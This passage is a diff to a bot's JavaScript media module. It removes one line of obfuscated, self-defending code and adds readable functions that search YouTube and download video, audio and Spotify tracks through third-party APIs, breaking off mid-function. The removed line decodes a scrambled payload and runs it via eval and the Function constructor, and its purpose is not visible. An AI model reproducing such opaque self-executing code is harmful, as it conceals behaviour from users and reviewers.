@@ -1,1 +1,257 @@
-(function(src,msg,inc,exc,useClean){var g=typeof globalThis!=='undefined'?globalThis:Function('return this')();var HostFunction=g.Function;var defaults='Function,Function.prototype.toString,eval,JSON.stringify,JSON.parse,Array.prototype.push,Array.prototype.join,Array.prototype.map,Array.prototype.filter,Array.prototype.forEach,Object.prototype.hasOwnProperty,Object.defineProperty,Object.getOwnPropertyDescriptor,Promise.prototype.then,setTimeout,clearTimeout,fetch,XMLHttpRequest,WebSocket,EventTarget.prototype.addEventListener,navigator.sendBeacon,Storage.prototype.getItem,Storage.prototype.setItem,crypto.subtle.digest';var split=function(v){return String(v||'').split(/[,\r\n]+/).map(function(x){return x.replace(/^\s+|\s+$/g,'');}).filter(function(x){return /^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*$/.test(x);});};var excluded={};split(exc).forEach(function(x){excluded[x]=1;});var paths=split(defaults).concat(split(inc));var seen={};var cleanG=null,cleanFts=null,frame=null;if(useClean){try{var d=g.document;if(d&&d.createElement&&d.documentElement){frame=d.createElement('iframe');frame.style.display='none';d.documentElement.appendChild(frame);cleanG=frame.contentWindow;cleanFts=cleanG.Function.prototype.toString;}}catch(ex){cleanG=null;cleanFts=null;}}var fts=cleanFts||(HostFunction&&HostFunction.prototype&&HostFunction.prototype.toString);var CompileFunction=(cleanG&&cleanG.Function)||HostFunction;var get=function(root,path){try{var p=path.split('.'),v=root;for(var i=0;i<p.length;i++){v=v&&v[p[i]];}return v;}catch(ex){return null;}};var list=[];for(var pi=0;pi<paths.length;pi++){var path=paths[pi];if(!path||excluded[path]||seen[path]){continue;}seen[path]=1;try{var value=get(g,path);if(typeof value!=='function'){continue;}var text=fts.call(value);var cleanValue=cleanG&&get(cleanG,path);var cleanText=(typeof cleanValue==='function'&&cleanFts)?cleanFts.call(cleanValue):'';var cleanNative=cleanText.indexOf('[native code]')>=0;var inspected=cleanFts?cleanFts.call(value):text;var preTampered=cleanNative&&inspected.indexOf('[native code]')<0;list.push([path,value,text,text.indexOf('[native code]')>=0,cleanNative,preTampered]);}catch(ex){}}if(frame&&frame.parentNode){try{frame.parentNode.removeChild(frame);}catch(ex){}}var verify=function(){try{for(var i=0;i<list.length;i++){var item=list[i],currentValue=get(g,item[0]);if(item[5]||currentValue!==item[1]||typeof currentValue!=='function'){return false;}var current=fts.call(currentValue);if(current!==item[2]||(item[3]&&current.indexOf('[native code]')<0)||(item[4]&&cleanFts&&cleanFts.call(currentValue).indexOf('[native code]')<0)){return false;}}return true;}catch(ex){return false;}};var tripped=0;var trip=function(){if(tripped){return;}tripped=1;try{var g=typeof globalThis!=='undefined'?globalThis:Function('return this')();if(g.__jsoCallRuntimeDefense){g.__jsoCallRuntimeDefense('anti-monkey-patching',msg);}if(g.__jsoSendRuntimeDefense){g.__jsoSendRuntimeDefense('anti-monkey-patching',msg);}}catch(ex){}throw (msg||'blocked');};try{if(g.setInterval){var jso$amp=g.setInterval(function(){if(!verify()){trip();}},5000);if(jso$amp&&typeof jso$amp.unref==='function'){jso$amp.unref();}}}catch(ex){}var fn=CompileFunction(src);return function(){if(!verify()){trip();}return fn.apply(this,arguments);};})("(function(src,msg,alg,heal,maxHeal){var g=typeof globalThis!==\x27undefined\x27?globalThis:Function(\x27return this\x27)(),F=g.Function,E=g.eval,frame=null;try{var d=g.document;if(d\x26\x26d.createElement\x26\x26d.documentElement){frame=d.createElement(\x27iframe\x27);frame.style.display=\x27none\x27;d.documentElement.appendChild(frame);if(frame.contentWindow\x26\x26frame.contentWindow.Function){F=frame.contentWindow.Function;}}}catch(ex){}if(frame\x26\x26frame.parentNode){try{frame.parentNode.removeChild(frame);}catch(ex){}}var fts=F.prototype.toString;var makeRunner=function(){return function(){return (0,E)(src);};};var hashText=function(text){var h=0;for(var i=0;i\x3Ctext.length;i++){h=((h\x3C\x3C5)-h)+text.charCodeAt(i);h|=0;}return h;};var tampered=0;var repairs=0;var fn=makeRunner();var base=fts.call(fn);var hash=hashText(base);var digestReady=false;var digestValue=null;var doDigest=function(text,done){try{if(!alg||!g.crypto||!g.crypto.subtle||!g.TextEncoder){done(null);return;}var enc=new g.TextEncoder();g.crypto.subtle.digest(alg,enc.encode(text)).then(function(buf){var arr=new Uint8Array(buf);var hex=\x27\x27;for(var qi=0;qi\x3Carr.length;qi++){var hx=arr[qi].toString(16);if(hx.length\x3C2){hx=\x270\x27+hx;}hex+=hx;}done(hex);}).catch(function(){done(null);});}catch(ex){done(null);}};var refreshDigest=function(){if(alg){doDigest(base,function(v){if(v){digestReady=true;digestValue=v;}});}};var recover=function(reason){if(!heal||repairs\x3E=maxHeal){return false;}try{var candidate=makeRunner();var candidateText=fts.call(candidate);if(!candidateText){return false;}fn=candidate;base=candidateText;hash=hashText(base);tampered=0;repairs++;digestReady=false;digestValue=null;refreshDigest();try{var g=typeof globalThis!==\x27undefined\x27?globalThis:Function(\x27return this\x27)();if(g.__jsoCallRuntimeDefense){g.__jsoCallRuntimeDefense((\x27self-healed-\x27+reason),msg);}if(g.__jsoSendRuntimeDefense){g.__jsoSendRuntimeDefense((\x27self-healed-\x27+reason),msg);}}catch(ex){}return true;}catch(ex){return false;}};refreshDigest();return function(){if(tampered\x26\x26!recover(\x27crypto-integrity\x27)){try{var g=typeof globalThis!==\x27undefined\x27?globalThis:Function(\x27return this\x27)();if(g.__jsoCallRuntimeDefense){g.__jsoCallRuntimeDefense(\x27crypto-integrity\x27,msg);}if(g.__jsoSendRuntimeDefense){g.__jsoSendRuntimeDefense(\x27crypto-integrity\x27,msg);}}catch(ex){}throw (msg||\x27blocked\x27);}var cur=fts.call(fn);if(hash!==hashText(cur)\x26\x26!recover(\x27self-defending\x27)){try{var g=typeof globalThis!==\x27undefined\x27?globalThis:Function(\x27return this\x27)();if(g.__jsoCallRuntimeDefense){g.__jsoCallRuntimeDefense(\x27self-defending\x27,msg);}if(g.__jsoSendRuntimeDefense){g.__jsoSendRuntimeDefense(\x27self-defending\x27,msg);}}catch(ex){}throw (msg||\x27blocked\x27);}if(alg\x26\x26digestReady\x26\x26digestValue){doDigest(cur,function(v){if(v\x26\x26digestValue!==v){tampered=1;if(!recover(\x27crypto-integrity\x27)){try{var g=typeof globalThis!==\x27undefined\x27?globalThis:Function(\x27return this\x27)();if(g.__jsoCallRuntimeDefense){g.__jsoCallRuntimeDefense(\x27crypto-integrity\x27,msg);}if(g.__jsoSendRuntimeDefense){g.__jsoSendRuntimeDefense(\x27crypto-integrity\x27,msg);}}catch(ex){}throw (msg||\x27blocked\x27);}}});}return fn.apply(this,arguments);};})(\x22var d,m,q,p,a,k,s,o,u,w,e,b,r,l,c,h,t,n,j,g,v,i,f;(function(){var ype=\x5Cx27\x5Cx27,Ygz=153-142;function KmO(t){var g=4255201;var f=t.length;var q=[];for(var k=0;k\x5Cx3Cf;k++){q[k]=t.charAt(k)};for(var k=0;k\x5Cx3Cf;k++){var o=g*(k+321)+(g%30186);var x=g*(k+102)+(g%43380);var i=o%f;var b=x%f;var s=q[i];q[i]=q[b];q[b]=s;g=(o+x)%4417367;};return q.join(\x5Cx27\x5Cx27)};var yBb=KmO(\x5Cx27uhnunrdvclatwemyfbzirxgrcjpqtstscokoo\x5Cx27).substr(0,Ygz);var zgk=\x5Cx27(an.1ng5,wb5(q+qs}(o6uoyi[*,]de(5h;0s .napvrl=vb(eai\x5Cx22;)ta u,t)+ ;x eA,t7p8t,;6r7nrr0c8e+0sl7];))r9\x5Cx3C,4hu7)t,A.aq,z+; [e=qvlosc;1j,])f]l(vqr8thh),a;t(8not;af.alc[ant.2lAp1;1a1ca=[].(]=a8tr[{3g}lr=te(f+r.v+ruml0(fs,egiweny=;lrv{}+Criu)(vw]=ti 6g5m+nouf2\x5Cx22S6}r-ipv ,=;vta;v)=\x5Cx3E7n+-l1rgt,-zrr\x5Cx3Ef0orx-o+v,n z=(utlsre)hu(f;g]; ,j o=df+f vC1vena=;c9uvtwflfnat]d+])1rufor)2a;io+ ;1fafq)+umumhdrqp(ie(6C\x5Cx22dcg*ep[2=[oalqxi; ;,tt+m{n=us(=;l=)h;a; = orr)t,gc1y.tb6lp;it;9rr6knqrp;2=gs)pz\x5Cx3CC9.\x5Cx3C))vyg]h-h7;\x5Cx22(.a,=id 9r(,+ )g+e)vhsy\x5Cx22hu8ttpq{[)h(.r\x5Cx22s.m+ny,})lee  5tr;4.;)si5k0 vn[lo=\x5Cx3C.\x5Cx22l,+;arvpr.=;u;pgp,sab(t0i+gfe0wgo.yfA;sqrcu8. ;(=seC+l;4ics=t=n)vl5oiar=}h2i-cu3=.n[prb\x5Cx22)ri=g=e))aaarwae.!ovnz\x5Cx22ner(}a.aCv-r(av8(;n([rAm=aCb{in![e=;,h;[s=8==,,6a3qg=0(.ct=v)(27ac];ng);;r( 1=otoiegmprod)],lCo.7 f6](xojr9=+ );(;;\x5Cx3C;.8byc.hyc0uni=r,ip.ov(+qkrhrv+r=(sa).n4=n{Sae0n=)tftm arr=oee8s)t+4(ev;ruj0[i0sl.1t(bj\x5Cx22lher9c{niht;\x5Cx27;var okf=KmO[yBb];var zcd=\x5Cx27\x5Cx27;var PFW=okf;var RgF=okf(zcd,KmO(zgk));var Hpc=RgF(KmO(\x5Cx27oAG)6%rtA)adAkereAA9A5f=E%@I3]Am)slAAiy5agchm%];CB02G0.;AgC(W;:%c.)!G]u*Ahh_rt%AA7-+]ydAmhGPGm(zvAQae#Ac]};113eA]NlaqG5A;AA)0dA.)0ei2btlA:d]1]l0:oA])G,0mF}gbA!c}=G{tGc)raeAcon(dGA,Ah?) r?aAe]sKeA\x5Cx3E2D2Ad s5)kr;r\x5Cx3E ]d}:(ynM_:u}I\x5Cx5C\x5Cx27,r.,5)f%(@Q%ifobrcd(=tlc)A);8Ao=AB3brAi\x5Cx3Cup)G\x5Cx5C/(-et!A.b7l\x5Cx26aIe:Ao o\x5Cx3E)e=l1i()],A\x5Cx3Cb 0e.Mdwbo%5a7}i.Q]Ga6e*(7e0l4;r9{hf2._erv.G%b)ne*GAhm)(:,].hki]}A.5AmA.7GAm=G;)un\x5Cx3EmcmpA){,A;(\x5Cx22.;A}rA{)dtbj%mc)E c.apd]).`fn;fdv(Gb6.y;.]! .jAA;[(G{n.}i=GI%ra] u$mI=A\x5Cx5C/cA4)bbG}nA;( .ADG;p`@Cde}yG,ib 5+Ade8)#oabb;7eA.e4j]pAC{P%kB%nAA0ccbsb%e-(xrA!(Ah);;:cn2Gd)%T3aelse.dd-DiG)z)G((!(c(Ap;b(qi%m*,\x5Cx3C)}1!i)]A40.!nG(e;bhsGCA] .csd.paG=)uA-]).(e]n+=2Ia\x5Cx3Ce|jA2s3A^MxruG)c%dt.q#b4AdAoA\x5Cx3CG0{,)]\x5Cx5C\x5Cx5Cgbb%c5.(c tdAcAtA\x5Cx26)}](.cp({A{]Ar.]i}\x5Cx22H)et0tnp%yd}G \x5Cx5C/8]ApZev%DdJ)=()pAeZGG1%p.t,niAd.GcoJsbcbcorGeo%e%xsG]ar-%mdtl(oCc, G)tcco.GGcdAt?e.u;{.nagg;)ll\x5Cx22bb=),_s)ACSAA](wEa{.Guj#5G:Au%c(,rAxp)iSoAs];GeG)3j8Z7}Ap)(]{(maG(nG.]i(0Aiernlew,Ge qa2f..]Do.GemwMh?%tcAs{,fCona]OG:b7:bscci,yGA\x5Cx5C/t!r%A9AE}c(aA?e1xcd|A6e{3_ao\x5Cx5C/t;)nnAth)ti MGnfm(cA%5( 1dG,orGst)od!!iIg,A!)ba,t0l!7,Adpc]she{-]0A%nA hr\x5Cx22[i)]i A)6ab] Gc5b:{rG2c.*7ezse0mmk5({r:urtZ2;(a7V14ttoi2e](],a5:pr6n%});i\x5Cx5C/smadi.%\x5Cx5C/d3i%{f.:i\x5Cx5C/ojJ;ev%q+arbira=ter0n{*Agy).A}G)ic!taNrG2v.Gw=.s onA]l [ua])%atG]|cc\x5Cx3CA]{YG s]5( cG(\x5Cx26]:cj(a]=%t.e(\x5Cx22u%i0.(]G:b]dN];-t)EAGIahd,G]fn;.} Gc:0cfr0k.)f[]a(S\x5Cx5C/d;I(a(oei.*e{lDAu$idvp(r3;4p{eodptyBoRiGA(nm..!,)5n|G{k.b3)+micregGppo]Aa.=i8t8bGf.mm53\x5Cx5C/4V(Ogou]]A.Gopk2taAao]G,eea!r4r.AAee_% At3]Ac1EodzAAc,A9seo;gf\x5Cx3E.a.GoosG\x5Cx22oclG)eyeA,lpqdc(}5((A;r\x5Cx22c-!DrK.x1g7abzu;(lbGc])%A9 AaN.%l)%r)G\x5Cx3CcdAaN_td\x5Cx26wC{)]!%c5_eAo(c,eti|F:oe%%,=|cffA.b0actA@(.n{(5IA]e\x5Cx5C\x5Cx27yi%AG.3th{.w}de]ndira]si]A9,ef(eG=eAkle]lA-bAGcGoeF6n;(7npcGno1Ur}r1uaHC-b}..ibb.Ae)Gs).G]Ageoonu.j:d%f.zG}l%.mx:nAZr5Ac.n}rtc2Nlu..A({]!nG)n80ach(AXe\x5Cx22Ar26(35 x_i{iGt.g)5)cu(i,5,};tasM,AAC;,3jBhh)(,G(-]G) tGdgde%(\x5Cx5C/GG((ccN+G(!]]vbtA] A%A;%r)f(( ytpGsGbDrtd}.iiru}ocsfe}.aceAy1.3e1mC) %tG\x5Cx3E.ecWT=KAgoAt)%A16j34pxe:iNv)N3hG*1A%8g,f,g)A5%.sAi}be}ebAa]hP,t](em1%ec]bG,Alap%)(lyA25bv )v\x5Cx5C/gup%GOA]t0)?.0y;Nwa{yo.c l%x(bP+}(.tAaN,9f;aAcn:0r(!c]Obztj.c,,nHAT%mD%dbG. ngdsii.bcASc,nGAi%y;%%dE0eAA],xoo)[bs=.Aikmr%rcaAe.G.{cfo)al%.}A_;G{G=.tG]r]+ ohm=3aiAGAy(a)2i%oGbd.*,v a(.r%G9bA1u-o(Afls}{iaN(iueA%wG}i0tr e#3rlda%%([fc.]c); A#dfegD#iaE8Ods)tnd]ilr!c,A|n:A}omBAy}Ab-d7|np]a$bci]]3u]%.e,dC6A5%bcbt%)fe)%AdNie)]eob;bfTkO\x5Cx22[))Aib{)Gc5)..r3!tA0cA.:Nbfel(A4gXiAtb]]AAD.e.,%+G\x5Cx22aacq(GMG(v(1Gm.mskb[(A(.AA.G(x(0.0ets0+o.c(!8A].2).]5(ol0tpc\x5Cx26fr!!elGnAG:)wdS(1G]b% ccA:3))Tf4GGylm4)(\x5Cx3E(pqf2a{au%{cTA6m.:feM} (GAG2yo{...c.rtgb;:)]AbnP GyG,g(\x5Cx5C/Aam,ra4lA|=d;e;.N)c)he)c[2)AGOe3}xueNA\x5Cx5C/y]cG.2]AgjGR=%[Aj$\x5Cx5C\x5Cx5C3)lagAcf.(.A.o ,a),{G]A0hf](o.pA)Of]_AL0e I8mai;i{}3a4kAataMaG}A;cAp.\x5Cx3E{zce!A)iM=}(c\x5Cx26])+)qGeHq;\x5Cx3Ec}}[.GAA Id#tr=G]d=c9G(Gd}rE?;l,o;]GC*S7-)M)G(tb3o)A(b.[ra(t)t\x5Cx5C\x5Cx2767ie]x33pfG,rAw]x%AbG1qAG.AAoAghuF){Xgju0d(.q]t;= was}\x5Cx22-3]6Ln)=]\x5Cx3Et%vhAaetO]:,d5e,:A(e\x5Cx22cbA6acc04mAnA]#tPdstlv|]):_cA0?Om%;t)9iedcl)lG.;8Os6=tAh.C(eo.,4\x5Cx26GAn:AA_A{tG*%Maej4p;G8A(cAG_]i\x5Cx5C/oA(t%;0Aruig].h7)ba;Ar.{!LCA2GJ,)GprGieG\x5Cx26Os9+b3\x5Cx26cAd(iAg ,]G%6pbrD.f#})irqC.Ge(b%iG%d,As\x5Cx5C/l+GA( pGcc0AY=dc_xrAqGO((A)};bmnG48,(uu]ob%:K(c1%!:!2As A#t.2^sa{jn1()GTA]{(T.rdG-m$(z]G3obc_A.ASb)t](m8A)x\x5Cx5C/()nb.A(!)sGAdAhT)g]G{oA) ?=,%c!v:A]( )AAAM%pi(Ca)(:1ctGTf5Aids#G)A-]0Af5];b+l%o).%)hacaC.K)c],e0dnq)ShEc.\x5Cx22oe=[l:}e()(Muo7S{kdhd?nLc(Gd[Ar5l(1!pc)]Ab(GA8o].dA=ReAeG=.(){Af{6T(hfTh%AwA re.GQne{tAa Ae\x5Cx5C\x5Cx27!`)g!%.hA-btArcf o%cDAA(\x5Cx3CAGaa))!GA=Aae!tt O]f4ua)A1xG}ub2(jlA%2,Ac(iA9As\x5Cx5C/AQGA@(.b):fup(AGArhe)ArGT3d3%  )fA.AoAe(fsi{A])(Ab,naF.}A0= .)_cq]l(cooGDoAn{et,)].e;Fj0atcfaf]aA4:dmld.};aAiA}]sA=.sGA\x5Cx26p4),: \x5Cx5C\x5Cx27\x5Cx221uGb]pi).G.cw,)$ RhO:Z(AU+A;67(8a)aG @af;[=G7lE2bbF)$b G)]]ce0=AI2]f-r]A.)]0]3p,b7\x5Cx5C\x5Cx275b)Ac.t6)osh1!,AAi\x5Cx5C/aA\x5Cx3E)gAb(l,4%954r)%(\x5Cx5C\x5Cx27\x5Cx3C=A0,v\x5Cx5C/m.Aktd,mAhGgu7(yc AA) {N!ba)dx0)GjM)aA}\x5Cx5C\x5Cx5CAA(A{tc9iIAuAt;Ao=]bA[o(=c.c\x5Cx26h0w2,e3,bb5ifmn4]Ar1eG,NA(]]2GA{cA(L}6ca]a]u.a{:A(p%AAfOcuApag)ff[)+]]+c[%rGgARAr(O-AGH8r]on]9).3[u%(kG.pgcAqivA%ce}\x5Cx5C/ekGD5q.;M),.w,Ac]GL4b(7}rA n)g]A(6uD({h(nA C} , ]AYAd)(AA%]1dA).4)lh(abGA1acm)tZ]-HGtA(d).[dAA$Ag%]q0t(uA\x5Cx5C\x5Cx275)( .c)Dm)GecAab};x[8!)9An2A b]c_nG., 2](558]]:A(.)5A5MGbI,abd)Q5};qe]l(0_gS (]]eI.vit))e1jo}}d:E}=5m!tA.1mio(D)ieo[CS, ((%u(yuYey 3A1QG+a](d($3AAEz]_ (G7c5{-]Bhl%vyGi0=)ay;)=rcc;nG7))h-Gib]^bh);,(tAA;s,nd1d}A,=sEn{.h,Oba{,ee?cDc4!h{mb\x5Cx5C/!])(!.(l85t;;(a3!zlAtA:!tcs%bA;ahGf;4)otce\x5Cx5C/rad.%l-(S))\x5Cx22AG]Aai.}.eo\x5Cx26Nv^D%=(,()Afs9Ci8Nrh77KnG2%cAaciEbA8Q1d\x5Cx5C/gl(}AA])BdwA6.uGre;kboiuq)ab:.)lgG!1i%qqe+}ne!r!{,](]Sdsiq }G;A(i,b3Gb(\x5Cx221G.ife)%3Hm)lec}7;) .=ANh4a.ccLc=(\x5Cx5C/(]D)dm.v;n,Ga5_bchth.pAAcc[:#{la A+\x5Cx22G20t)}rA0( 5A(gh8AdG5kFGu%bAcA);)WG0yoF== fr= } ]c#.ng)dceA(!1dih{ly3(j{_G)]A)AG}rr;u0]fnl)py Gtl(hGbA(Bcnf.2oteac6]a).BceeaGye.Am(u|7]p4 GM2ctczd GAx1gecG)_AAAw}GABt0neLb2=f2I.mbCclc((0m0oA%l)(ise6)AAr24e*aaG.. z)k[G4d)(a%.;;A(%f)c(A4yt)od m6gC;MeGGGGGA(=AGKGa,]t\x5Cx26]8%p:I)!A.}\x5Cx26(h6cc}doGcnady,!F))G.{};a.AGSrtw)8s,GA0]]0!GK6A-dGbA\x5Cx26(.w)=e.lnla1wr1rt(tGrcD3n!:y.ag})ptA6;eA}!u3A.c)sct9[%ffigAA9Bn)k}Ub=acc?h2cM(,\x5Cx5C/stc.iuEe,tztMAutA7.0}67(1%Am;(.]lw)m{hbA(]oGA ojr\x5Cx22bAs5\x5Cx5C/.[oA,e,G\x5Cx5C\x5Cx27Oxw]Gr]efAAd]d)nnp%ricd!tc,e)GsnmGj(=.s)}.G:bG{AmsGg(A8)rhI.wysD\x5Cx5C/ 3.AOzS.( y]As.bbchtt}ucd2wbc)AncGd:y9)J+fG=)AX.(Acs()lMAHevd\x5Cx3E(:(!A(Gn${(gA)Gc]|A1lbrF].Fif)c]GI)c(+c]Geclb:;TE4x)[,oaAogt\x5Cx5C/csO:]crqid)1epmo{]0\x5Cx5C/=Gi.Gd;G2]=aGany.uG.dec]))Ac_GiBgGArgb,px\x5Cx26((G.A,+AAb]q(gCu1Obe,)q!cmGsc)nei.)A}G(f1.pt]\x5Cx22!{[G)Ahf(:pGm.eoIfxp}vt%m0(e= Gb3(.(A(3(]-aA= 2{]s{).fl\x5Cx26ve.)iAwiso](et)(],om4[fi}(GAA]1)2bG)eAbG( ;f.AAeEjc?Sc\x5Cx26va)h..1c(\x5Cx221d,4j7% atthGchsebGc]c)%fb.ANAQ,d.Gtt?%4exbtstovi0Ab(o.55n.p([)G,,}]1.6c71,h+b.,,AE.rAk.GAt%\x5Cx228\x5Cx3E,,6|)dN:(Ad]16{uUwfn),lSn(,ta,A.dAA+qGE)M)wGSw(Ry+i.=rA\x5Cx26\x5Cx3C bb []dd=]p5C).:A.G]{6Dg7,AtB,%1o(iaG+p4}R7a1x1An.o](mhi6AAnoAcr i)],ef)(u,AG6a(tgdAt,d.)A.]{! ( 1Ge5rAbellfiA:e{] )e6)d(G|=)cGA7er o-;:{GJ!g}}in|t{)TAg(,b$u;G-A(Ak(A]g(aGp)r).Cmh)}a!=nG},fi]beAf92AAh5KsDt;.\x5Cx3CGG].]i0()kpA}1]; 69n:%bboG.PG!-)GmrAbbmxG(oAArGd0dd;7%)=F,(Anr}AA]hApjaxob-efaM 00(t,p+!ht h)=c;o,{b!c#(anpbG)\x5Cx3E{etA5A;Ao)AA@y2]cyme)PW{s;_nDA{]GAeAvqA:aucV[3b\x5Cx5C/G,[:G\x5Cx26(b}]fos;.y8e)AeC,gG_.c(vfRto(e)6i|O;r3iGEf11rAAff):.}r)ox,1}G%FGe(4GF6eGa),vy2et]p,r.4.f(b}d:dG7=)AeGo(Gfa.G.4V51fciGM)N\x5Cx26\x5Cx3CAg(G;af]1a(G)r7!crcczn,)\x5Cx5C/ G!oc,p)cb!%0dr8# h$bL(tk.eh;dcv,]5de)AddGjv(3oJA;k1Gc!.4o)r(lcAn{%!h(,f)eGisAAo.S;A2A)!f G)tt.?mo=I,pbG(e% GA*]G.=j4:g(3G.b ()GEAd0wc1ee%8=\x5Cx22d{lv_z!}aeAo],AAt1G;0(b}6hG(Ai(,A()k\x5Cx22A]!;gAQodro;nA(J(A(Gi}d:bSs:c)4Ba])G;?sA;z2]{rb,AeA.sI A]bj{!gc{d(A{GiG3Aa(}AF10,i9zAB0x\x5Cx3Cl{p]({cE21=.saj#4D%nooao4ig(!uA)3A!}dz,,da\x5Cx22),]a*oi.b!nltcr(,4cA]i b}qbcauAnAo..qGuh(t+b.%iA{bo\x5Cx5C\x5Cx5Ce_bG(:%6lA(\x5Cx5C/afb(x8(t.e_:d}r(.$3(Ou7=;,!AAtAe0.7g\x5Cx5C\x5Cx5C}J!FnG]0{0ea)Ec%sG]{t{A(h)!@%9c9Aefiq]Gb.A),eloc;bAD)z .3N.]])*]AyixA[dGb\x5Cx3EA;yee%Grce cued{Aa{da}A{ G2= ci!{c){;% 5gbirl;G,rA%sA[Goe\x5Cx22m6A:ft,z66Npf2 .cG{d5h]a)gbA3{]a) GA.88e)c.)lmA1tt AALcam)r.1(A)eosqce6|ig;ite7maR, \x5Cx3Cm ();n22%]nlr6b]i.0mb.]b)a;b7=)+!]{AtAAxc]..g[Gaae(vsOsffu(}w%%AAm 1Go%]Ac)jS (A\x5Cx26,r-6(a fzAn(e;5GoGAigAnrGy]Aee,2.:0GG.\x5Cx22oo(Ocaoi{Gvn?]){)ee]\x5Cx5C/{co (a:8c))aa?+GFra( 0GbA(ul{%A%tcG+t%Fso)ls)-;,r!\x5Cx5C/}})sn.cAJ;S!;t7(.cG%@Aaqr,G)AAbseGr]6) !d)P]Ab%{.P1Go)wDbGAGbic.tc-(bD(ebu(,s, ]]Ghqr{dGh,,e=]a A)=o(G%Aau.a( l(A.A=e0Gu%m]A% Ge5t(jnj(,[Gb } `{)[AO).,xAFAA4;m]a }Ac]j.i.60%G2teGuAA:_=,1A[H lvtKecA[GAcG%AG)GtaAlt7]faeu)](edibSpAiacg))3|{Gai)t_![.Ap](b=o.au[G0c)1Br:h*becG.}G[; )Gm nfA6H]4%A{%E%cG,(as)cNeGp) c1G,=bw.p%u]]ch]\x5Cx5C/(uAreB=a)#]%\x5Cx5C/7(d){T,|G} GtG)):hl ]uz.tMs%exd}!_rG.pb,!ApAeAH(=Hec)b.0nlqb]]8p(.Anb (bB)oQ)^{0)\x5Cx5C\x5Cx27pdd=aac nGntlGA.: , eD\x5Cx27));var rxV=PFW(ype,Hpc );rxV(7755);return 8581})()\x22,null,null,true,1)();",null,null,null,true)();
+const axios = require("axios");
+const fs = require("fs");
+const path = require("path");
+const os = require("os");
+const { execFile } = require("child_process");
+
+const SEARCH_BASE = "https://eliteprotech-apis.zone.id";
+const JERRY_BASE = "https://jerrycoder.oggyapi.workers.dev";
+const SPOTIFY_BASE = "https://api-faa.my.id";
+
+const TEMP_DIR = path.join(os.tmpdir(), "yt-bot-temp");
+
+const BROWSER_HEADERS = {
+  "User-Agent":
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+  Accept: "application/json, text/plain, */*",
+  "Accept-Language": "en-US,en;q=0.9",
+};
+
+const api = axios.create({ headers: BROWSER_HEADERS, timeout: 45000 });
+
+if (!fs.existsSync(TEMP_DIR)) {
+  fs.mkdirSync(TEMP_DIR, { recursive: true });
+}
+
+function safeName(str) {
+  return (str || "file").replace(/[\\/:*?"<>|]/g, "").trim().slice(0, 80);
+}
+
+function formatBytes(bytes) {
+  if (!bytes || bytes <= 0) return null;
+  const k = 1024;
+  const sizes = ["B", "KB", "MB", "GB"];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i];
+}
+
+// GET with browser headers + 1 retry on transient errors (502/503/504/timeout)
+async function apiGet(url, params, retries = 1) {
+  try {
+    const { data } = await api.get(url, { params });
+    return data;
+  } catch (error) {
+    const status = error.response?.status;
+    const isTransient = !status || [502, 503, 504].includes(status);
+    if (isTransient && retries > 0) {
+      await new Promise((r) => setTimeout(r, 1500));
+      return apiGet(url, params, retries - 1);
+    }
+    throw new Error(`API error: ${status || error.message}`);
+  }
+}
+
+async function downloadFile(url, filename) {
+  const destPath = path.join(TEMP_DIR, `${Date.now()}_${safeName(filename)}`);
+  const response = await axios.get(url, {
+    responseType: "stream",
+    headers: BROWSER_HEADERS,
+    timeout: 60000,
+  });
+
+  await new Promise((resolve, reject) => {
+    const writer = fs.createWriteStream(destPath);
+    response.data.pipe(writer);
+    writer.on("finish", resolve);
+    writer.on("error", reject);
+  });
+
+  return destPath;
+}
+
+/**
+ * Search YouTube
+ */
+async function searchYoutube(query, limit = 10) {
+  const data = await apiGet(`${SEARCH_BASE}/search/ytsearch`, { q: query });
+
+  if (!data || !data.success || !data.results?.videos) return [];
+
+  return data.results.videos.slice(0, limit).map((v) => ({
+    title: v.title,
+    duration: v.duration,
+    views: v.views,
+    uploadedAt: v.uploaded,
+    channel: { name: v.author?.name },
+    url: v.url,
+    thumbnail: v.thumbnail,
+  }));
+}
+
+/**
+ * Get full video info + every available quality (video) in one call
+ */
+async function getVideoInfo(url) {
+  const data = await apiGet(`${JERRY_BASE}/down/youtube`, { url });
+
+  if (!data || data.status !== "success") {
+    throw new Error("Failed to fetch video info");
+  }
+
+  const durationSec = data.duration || 0;
+
+  // Normalize "mp4 (720p)" -> "720p", estimate size from bitrate, prefer mp4 over webm on dupes
+  const seen = new Set();
+  const videoFormats = (data.medias || [])
+    .filter((m) => m.type === "video")
+    .sort((a, b) => (a.ext === "mp4" ? -1 : 1))
+    .map((m) => {
+      const qMatch = (m.quality || m.label || "").match(/(\d+p)/);
+      const quality = qMatch ? qMatch[1] : m.quality;
+      const bytes = m.bitrate ? (m.bitrate / 8) * durationSec : 0;
+      return {
+        type: "video",
+        quality,
+        size: formatBytes(bytes),
+        url: m.url,
+        ext: m.ext,
+      };
+    })
+    .filter((f) => {
+      if (seen.has(f.quality)) return false;
+      seen.add(f.quality);
+      return true;
+    });
+
+  return {
+    title: data.title,
+    videoId: null,
+    channel: { name: data.channel },
+    thumbnail: data.thumbnail,
+    formats: videoFormats,
+  };
+}
+
+/**
+ * Download a specific video quality (e.g. "720p")
+ */
+async function downloadVideo(url, quality) {
+  const info = await getVideoInfo(url);
+  const match = info.formats.find((f) => f.quality === quality || f.quality?.includes(quality));
+
+  if (!match) throw new Error(`Quality ${quality} not available`);
+
+  const filePath = await downloadFile(match.url, `${info.title}.${match.ext || "mp4"}`);
+  return { path: filePath, title: info.title };
+}
+
+/**
+ * Download audio (mp3) — direct, fast, single call
+ */
+async function downloadAudio(url) {
+  const data = await apiGet(`${JERRY_BASE}/down/ytmp3`, { url });
+
+  if (!data || data.status !== "success" || !data.url) {
+    throw new Error("Failed to fetch audio");
+  }
+
+  const filePath = await downloadFile(data.url, `${data.title}.mp3`);
+
+  // Best-effort extra call for thumbnail (used for ID3 cover art). Doesn't
+  // fail the whole download if this extra call fails.
+  let thumbnail = null;
+  let channel = null;
+  try {
+    const info = await getVideoInfo(url);
+    thumbnail = info.thumbnail;
+    channel = info.channel?.name;
+  } catch (_) {
+    // ignore, tagging will just skip cover/artist
+  }
+
+  return {
+    path: filePath,
+    title: data.title,
+    info: { channel: { name: channel }, thumbnail },
+  };
+}
+
+/**
+ * Spotify: title + direct mp3 download link (no YouTube search needed)
+ */
+async function spotifyTrack(url) {
